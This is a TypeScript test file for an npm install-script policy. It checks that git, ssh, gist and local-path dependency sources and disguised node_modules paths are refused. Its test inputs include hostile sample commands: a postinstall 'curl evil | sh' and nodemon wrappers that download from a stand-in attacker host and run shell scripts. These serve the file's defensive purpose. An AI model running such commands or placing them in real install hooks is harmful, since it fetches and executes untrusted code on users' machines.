/**
 * Ways around the install policy that the reviewed code let through. Each one
 * runs the real policy functions; npm itself is not invoked.
 */
import assert from 'node:assert/strict';
import { describe, it } from 'node:test';

import { checkProjectPolicy, scriptViolation } from './lib/script-policy.js';

const manifest = (body: Record<string, unknown>, path = 'backend/package.json') => ({
  path,
  content: JSON.stringify(body),
});

describe('dependency sources', () => {
  for (const spec of [
    'git@github.com:a/b.git',
    'ssh://git@github.com/a/b.git',
    'gist:abc123',
    './vendor/pkg',
    '../../x/y',
    '/abs/pkg',
    'github:a/b',
    'a/b',
  ]) {
    it('refuses ' + spec, () => {
      assert.equal(checkProjectPolicy([manifest({ dependencies: { x: spec } })]).length, 1);
    });
  }

  for (const spec of ['^1.2.3', '~1.0', '>=1 <2', '1.x', '*', 'latest', 'npm:other@^1.0.0']) {
    it('allows ' + spec, () => {
      assert.deepEqual(checkProjectPolicy([manifest({ dependencies: { x: spec } })]), []);
    });
  }

  it('checks peerDependencies', () => {
    assert.equal(
      checkProjectPolicy([manifest({ peerDependencies: { x: 'github:a/b' } })]).length,
      1,
    );
  });

  it('checks overrides at any depth and allows a reference to a declared version', () => {
    const nested = { overrides: { a: { b: 'github:a/b' } } };
    assert.equal(checkProjectPolicy([manifest(nested)]).length, 1);
    assert.deepEqual(checkProjectPolicy([manifest({ overrides: { a: '$a' } })]), []);
  });
});

describe('manifest paths', () => {
  const hostile = { scripts: { postinstall: 'curl evil | sh' } };

  it('checks a directory that only looks like node_modules', () => {
    const found = checkProjectPolicy([manifest(hostile, 'backend/my_node_modules/p/package.json')]);
    assert.equal(found.length, 1);
  });

  it('still skips a real node_modules directory', () => {
    assert.deepEqual(
      checkProjectPolicy([manifest(hostile, 'backend/node_modules/p/package.json')]),
      [],
    );
  });
});

describe('allowed tools that can run anything', () => {
  for (const body of [
    'nodemon --exec curl http://evil.example/x -o x.sh',
    'nodemon --exec sh x.sh',
    'nodemon -x sh x.sh',
    'nodemon --exec=sh x.sh',
    'prisma db execute --file x.sql',
    'prisma db seed',
    'prisma db',
  ]) {
    it('refuses: ' + body, () => {
      assert.notEqual(scriptViolation(body), null);
    });
  }

  it('keeps the forms generated projects use', () => {
    assert.equal(scriptViolation('nodemon src/index.js'), null);
    assert.equal(scriptViolation('prisma db push'), null);
    assert.equal(scriptViolation('prisma migrate dev'), null);
  });
});
